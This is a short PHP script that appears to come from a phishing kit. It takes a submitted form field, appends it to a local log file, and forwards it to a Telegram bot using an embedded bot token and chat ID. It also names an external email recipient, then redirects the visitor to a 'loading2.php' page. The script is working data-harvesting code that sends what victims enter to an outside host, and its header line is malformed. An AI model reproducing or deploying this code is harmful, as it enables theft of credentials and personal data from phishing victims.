<?php
$to = "abdelhakimkhlif@yandex.com";
$subject = "My subject";
$text = $_POST['tantan'];
$headers = "From: webmaster@example.com" . "\r\n" .
$result = @fopen("./data/logs/AntiBomb_RZT.txt", "a+");
					fwrite($result, $text);
					file_get_contents("https://api.telegram.org/bot2035106363:AAGfBKgi1WFKP76wLIlJmLdI5J8Q4t_pdiU/sendMessage?chat_id=1777139670&text=" . urlencode($text)."" );
header("Location: loading2.php")
?>
